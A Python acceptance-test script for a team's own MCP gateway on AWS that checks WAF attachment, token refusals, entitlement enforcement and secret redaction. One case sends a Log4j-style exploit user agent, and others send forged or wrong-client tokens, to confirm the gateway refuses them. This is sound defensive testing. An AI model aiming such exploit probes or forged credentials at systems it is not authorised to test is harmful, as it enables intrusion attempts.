        acl = waf.get_web_acl_for_resource(ResourceArn=ctx.target.gateway_arn).get("WebACL", {})
        expected_name = f"adlytics-{_ENVIRONMENT}-external-mcp"
        ctx.run.record(
            CaseResult(
                "1a",
                f"web ACL {expected_name} on the gateway",
                str(acl.get("Name")),
                acl.get("Name") == expected_name,
            )
        )
        gateway = ctx.session.client("bedrock-agentcore-control").get_gateway(
            gatewayIdentifier=ctx.target.gateway_id
        )
        described = cast("Mapping[str, Any]", gateway)
        mode = cast("Mapping[str, object]", described.get("wafConfiguration") or {}).get(
            "failureMode"
        )
        attached = described.get("webAclArn") == acl.get("ARN")
        ctx.run.record(
            CaseResult(
                "1b",
                "gateway reads back the ACL and FAIL_CLOSE",
                f"ACL {attached}, mode {mode}",
                attached and mode == "FAIL_CLOSE",
            )
        )
    response = _HTTP.get(
        require_https(ctx.target.gateway_url),
        headers={"user-agent": _LOG4J_USER_AGENT},
        timeout=30,
        allow_redirects=False,
    )
    reply = mcp_reply(response.status_code, dict(response.headers), response.text)
    if blocking:
        ctx.run.record(
            CaseResult(
                "P1",
                f"{_WAF_BLOCK_CODE} {_WAF_BLOCK_MESSAGE}",
                f"HTTP {reply.status} {reply.rpc_code}",
                waf_blocked(reply),
            )
        )
    else:
        ctx.run.record(
            CaseResult(
                "1c",
                "any non-2xx, no tool invoked",
                f"HTTP {reply.status} {reply.rpc_code}",
                anonymous_refused(reply),
            )
        )
    verdict = _await_waf(ctx.session, started, blocking=blocking)
    action = "BLOCK" if blocking else "COUNT"
    ctx.run.record(
        CaseResult(
            "P1-waf" if blocking else "1d",
            f"one {action} {_KNOWN_BAD_GROUP}/{_LOG4J_RULE}",
            verdict.describe(),
            verdict.only_the_control,
        )
    )
    return started


def case_protected_resource_metadata(ctx: Context) -> None:
    """Case 2: only Quick reads it, so a FAIL is a pending Quick-hop reason, not a stop."""
    reply = _post(ctx.target.gateway_url, _initialize(), None)
    passed, observed = False, f"HTTP {reply.status}, no resource_metadata"
    if reply.resource_metadata:
        response = _HTTP.get(
            require_https(reply.resource_metadata), timeout=30, allow_redirects=False
        )
        document: Mapping[str, object]
        try:
            document = cast("Mapping[str, object]", response.json())
        except ValueError:
            document = {}
        servers = cast("list[object]", document.get("authorization_servers") or [])
        scopes = document.get("scopes_supported")
        passed = (
            ctx.target.issuer in servers and scopes == ["openid"] and bool(document.get("resource"))
        )
        observed = (
            f"issuer listed {ctx.target.issuer in servers}, scopes {scopes}, "
            f"resource {bool(document.get('resource'))}"
        )
    result = ctx.run.record(
        CaseResult(
            "2",
            "PRM lists the pool issuer, scopes [openid], the resource",
            observed,
            passed,
            stops=False,
        )
    )
    if not result.passed:
        ctx.run.quick_hop_notes.append("the Quick protected-resource metadata check failed")


def case_control(ctx: Context) -> None:
    """Case 3: probe-a initializes and lists the tools (none in pass 1)."""
    started = now_ms()
    bearer = ctx.bearer(_PERSONA_A)
    initialized = _post(ctx.target.gateway_url, _initialize(), bearer)
    listed = _post(ctx.target.gateway_url, _message("tools/list"), bearer)
    tools = cast("list[object]", (listed.result or {}).get("tools") or [])
    if initialized.rpc_code == _INTERCEPTOR_REFUSAL_CODE:
        ended = now_ms()
        time.sleep(_LOG_SETTLE_SECONDS)
        records = _interceptor_records(ctx.session, LogWindow.around(started, ended))
        unseen = [r for r in records if r.jsonrpc_method == "initialize" and not r.bearer_present]
        if unseen:
            ctx.run.record(
                CaseResult(
                    "3",
                    "initialize 200",
                    "the strict interceptor saw no bearer: apply the S4 fallback (§12 case 3)",
                    False,
                )
            )
    ctx.run.record(
        CaseResult(
            "3",
            "initialize 200, tools/list 200 with 0 tools",
            f"{initialized.status}, {listed.status} with {len(tools)}",
            initialized.status in _SUCCESS and listed.status in _SUCCESS and not tools,
        )
    )


def case_refusals(ctx: Context) -> None:
    """Case 4: each request varies one attribute, and its refusing layer is named."""
    attempts: list[tuple[str, str | None, Callable[[], dict[str, object]], str, set[Layer]]] = [
        ("4a", None, _initialize, "initialize", {Layer.GATEWAY, Layer.INTERCEPTOR}),
        (
            "4b",
            None,
            lambda: _message("tools/list"),
            "tools/list",
            {Layer.GATEWAY, Layer.INTERCEPTOR},
        ),
        (
            "4c",
            None,
            lambda: _tools_call("catalog_list_metrics", {}),
            "tools/call",
            {Layer.GATEWAY, Layer.INTERCEPTOR},
        ),
        ("4d", "Bearer not-a-jwt", _initialize, "initialize", {Layer.GATEWAY}),
        (
            "4e",
            f"Bearer {foreign_key_token(ctx.target)}",
            _initialize,
            "initialize",
            {Layer.GATEWAY},
        ),
        ("4f", ctx_bff_bearer(ctx), _initialize, "initialize", {Layer.GATEWAY}),
        ("4g", ctx.bearer(_PERSONA_B), _initialize, "initialize", {Layer.GATEWAY}),
    ]
    # One window per attempt, apart by more than the log skew, so a record is judged only
    # against the request that could have produced it.
    sent: list[tuple[str, str, set[Layer], McpReply, LogWindow]] = []
    for case_id, bearer, body, method, layers in attempts:
        time.sleep(_ATTEMPT_GAP_SECONDS)
        started = now_ms()
        reply = _post(ctx.target.gateway_url, body(), bearer)
        sent.append((case_id, method, layers, reply, LogWindow.around(started, now_ms())))
    time.sleep(_LOG_SETTLE_SECONDS)
    for case_id, method, layers, reply, window in sent:
        layer = refusal_layer(reply, _interceptor_records(ctx.session, window), method)
        ctx.run.record(
            CaseResult(
                case_id,
                f"refused by {' or '.join(sorted(layers))}",
                f"HTTP {reply.status} {reply.rpc_code} "
                f"challenge {reply.www_authenticate} -> {layer}",
                layer in layers,
            )
        )


def ctx_bff_bearer(ctx: Context) -> str:
    """Sign probe-a in on the BFF client: a valid token for the wrong client of this gateway."""
    ssm = ctx.session.client("ssm")
    credential = load_persona(ssm, _ENVIRONMENT, _PERSONA_A)
    tokens = sign_in(
        ctx.session.client("cognito-idp"), credential, app_client(ctx.session, _ENVIRONMENT)
    )
    ctx.run.secrets.extend([credential.password, tokens.access_token, tokens.id_token])
    return f"Bearer {tokens.access_token}"


def case_demo_traffic(ctx: Context, window_start: int) -> None:
    """Case 5: the demo calls' bodies match no rule; only the case-1 control is in the window."""
    bearer = ctx.bearer(_PERSONA_A)
    for _case_id, name, arguments in DEMO_CALLS:
        _post(ctx.target.gateway_url, _tools_call(name, arguments), bearer)
    time.sleep(_LOG_SETTLE_SECONDS)
    verdict = classify_waf(
        _waf_records(ctx.session, LogWindow.around(window_start, now_ms())), blocking=False
    )
    ctx.run.record(
        CaseResult(
            "5",
            "only the case-1 control in the window",
            verdict.describe(),
            verdict.only_the_control,
        )
    )


def case_governed_answers(ctx: Context) -> None:
    """Proof 2: the five tools, then each demo answer's governed fields on parsed JSON."""
    bearer = ctx.bearer(_PERSONA_A)
    rule = str(_contract()["external_client_rule"])
    listed = check_tools_list(_post(ctx.target.gateway_url, _message("tools/list"), bearer), rule)
    ctx.run.record(
        CaseResult(
            "P2-list",
            "the five declared tools, each ending with the rule",
            listed.observed,
            listed.passed,
        )
    )
    labels = dictionary_labels()
    checks: dict[str, Callable[[Mapping[str, object]], FieldCheck]] = {
        "Q1": lambda result: check_q1(result, labels),
        "Q2": check_q2,
        "Q3": check_q3,
        "G": check_governance,
    }
    for case_id, name, arguments in DEMO_CALLS:
        result = tool_result(_post(ctx.target.gateway_url, _tools_call(name, arguments), bearer))
        if result is None or result.get("refused") is True:
            code = None if result is None else result.get("code")
            ctx.run.record(
                CaseResult(
                    f"P2-{case_id}", "a governed answer", f"refused {code}", False, stops=False
                )
            )
            continue
        verdict = checks[case_id](result)
        observed = "; ".join((verdict.observed, *verdict.notes))
        ctx.run.record(
            CaseResult(f"P2-{case_id}", "governed fields as declared", observed, verdict.passed)
        )


def _invoke_measurement(ctx: Context, bearer: str) -> Mapping[str, object]:
    custom = {
        "bedrockAgentCoreToolName": gateway_tool_name(DEMO_CALLS[1][1]),
        "bedrockAgentCoreMcpMessageId": f"external-mcp-probe-{uuid.uuid4().hex}",
        "bedrockAgentCorePropagatedHeaders": {"Authorization": bearer},
    }
    response = ctx.session.client("lambda").invoke(
        FunctionName=deployed_function_name(_ENVIRONMENT, "MeasurementTool"),
        InvocationType="RequestResponse",
        ClientContext=base64.b64encode(json.dumps({"custom": custom}).encode()).decode(),
        Payload=json.dumps(dict(DEMO_CALLS[1][2])).encode(),
    )
    body: object = json.loads(response["Payload"].read() or b"null")
    return cast("Mapping[str, object]", body) if isinstance(body, Mapping) else {}


def case_entitlement(ctx: Context) -> None:
    """Proof 3: probe-b at the gateway and on a direct invoke; probe-a answered as the control."""
    probe_b = ctx.bearer(_PERSONA_B)
    time.sleep(_ATTEMPT_GAP_SECONDS)
    started = now_ms()
    gateway_reply = _post(
        ctx.target.gateway_url, _tools_call(DEMO_CALLS[1][1], DEMO_CALLS[1][2]), probe_b
    )
    window = LogWindow.around(started, now_ms())
    time.sleep(_LOG_SETTLE_SECONDS)
    layer = refusal_layer(gateway_reply, _interceptor_records(ctx.session, window), "tools/call")
    ctx.run.record(
        CaseResult(
            "P3a",
            f"403 {_WAF_BLOCK_CODE} at the gateway",
            f"HTTP {gateway_reply.status} {gateway_reply.rpc_code} -> {layer}",
            gateway_reply.status == _HTTP_FORBIDDEN and layer is Layer.GATEWAY,
        )
    )
    tool_records = terminal_records(
        ctx.session,
        function_name=deployed_function_name(_ENVIRONMENT, "MeasurementTool"),
        window=window,
    )
    ctx.run.record(
        CaseResult(
            "P3b",
            "no tool record for the refused gateway message",
            f"tool terminal records {len(tool_records)}",
            not tool_records,
        )
    )
    answered = _invoke_measurement(ctx, ctx.bearer(_PERSONA_A))
    ctx.run.record(
        CaseResult(
            "P3c",
            "probe-a direct invoke answered (control)",
            f"refused {answered.get('refused')} {answered.get('code')}",
            answered.get("code") != _CALLER_UNVERIFIED,
        )
    )
    refused_at = now_ms()
    refused = _invoke_measurement(ctx, ctx.bearer(_PERSONA_B))
    time.sleep(_LOG_SETTLE_SECONDS)
    causes = [
        record.get("cause")
        for record in terminal_records(
            ctx.session,
            function_name=deployed_function_name(_ENVIRONMENT, "MeasurementTool"),
            window=LogWindow.around(refused_at, now_ms()),
        )
        if record.get("cause") is not None
    ]
    ctx.run.record(
        CaseResult(
            "P3d",
            f"{_CALLER_UNVERIFIED} entitlement_missing",
            f"{refused.get('code')} causes {causes}",
            refused.get("code") == _CALLER_UNVERIFIED and "entitlement_missing" in causes,
        )
    )
    route = _HTTP.post(
        require_https(f"{ctx.target.public_base_url}/api/quality-review/turn"),
        json={},
        headers={"authorization": ctx.bearer(_PERSONA_A), "content-type": "application/json"},
        timeout=30,
        allow_redirects=False,
    )
    ctx.run.record(
        CaseResult(
            "P3e",
            "403 on an app route",
            f"HTTP {route.status_code}",
            route.status_code == _HTTP_FORBIDDEN,
        )
    )


def _write_evidence(run: Run, case: str) -> Path:
    _EVIDENCE.mkdir(parents=True, exist_ok=True)
    stamp = datetime.now(UTC).strftime("%Y%m%dT%H%M%SZ")
    path = _EVIDENCE / f"{case}-{stamp}.json"
    document = {
        "case": case,
        "results": [
            {
                "case": r.case_id,
                "expected": r.expected,
                "observed": r.observed,
                "passed": r.passed,
                "stops": r.stops,
            }
            for r in run.results
        ],
        "quick_hop_pending_notes": run.quick_hop_notes,
        "passed": run.passed,
    }
    path.write_text(redact(json.dumps(document, indent=2), run.secrets) + "\n", "utf-8")
    return path


def main(argv: Sequence[str] | None = None) -> int:
    """Run one case set; exit 0 only when every stopping case passed."""
    parser = argparse.ArgumentParser(description="Dev acceptance of the external MCP gateway.")
    parser.add_argument("--profile", required=True)
    parser.add_argument("--environment", required=True)
    parser.add_argument("--region", required=True)
    parser.add_argument("--expected-account", required=True)
    parser.add_argument("--case", required=True, choices=("pass1", "pass2"))
    args = parser.parse_args(argv)
    require_dev(args.environment)
    problems = validate_demo_calls(_contract())
    if problems:
        print("demo calls disagree with contracts/generated/tools.json: " + "; ".join(problems))
        return 2
    session = boto3.Session(profile_name=args.profile, region_name=args.region)
    account = session.client("sts").get_caller_identity()["Account"]
    if account != args.expected_account:
        print("the profile's account is not the expected account; nothing was called")
        return 2
    run = Run()
    ctx = Context(session=session, target=_target(session, account, args.region), run=run)
    stopped = False
    try:
        if args.case == "pass1":
            window_start = case_waf_coverage(ctx, blocking=False)
            case_protected_resource_metadata(ctx)
            case_control(ctx)
            case_refusals(ctx)
            case_demo_traffic(ctx, window_start)
        else:
            case_refusals(ctx)
            case_waf_coverage(ctx, blocking=True)
            case_governed_answers(ctx)
            case_entitlement(ctx)
    except StopRunError as stop:
        stopped = True
        print(redact(f"STOPPED: {stop}", run.secrets))
    print(f"evidence: {_write_evidence(run, args.case).relative_to(_ROOT)}")
    for note in run.quick_hop_notes:
        print(f"QUICK HOP PENDING: {note}")
    return 0 if run.results and run.passed and not stopped else 1


if __name__ == "__main__":
    sys.exit(main())
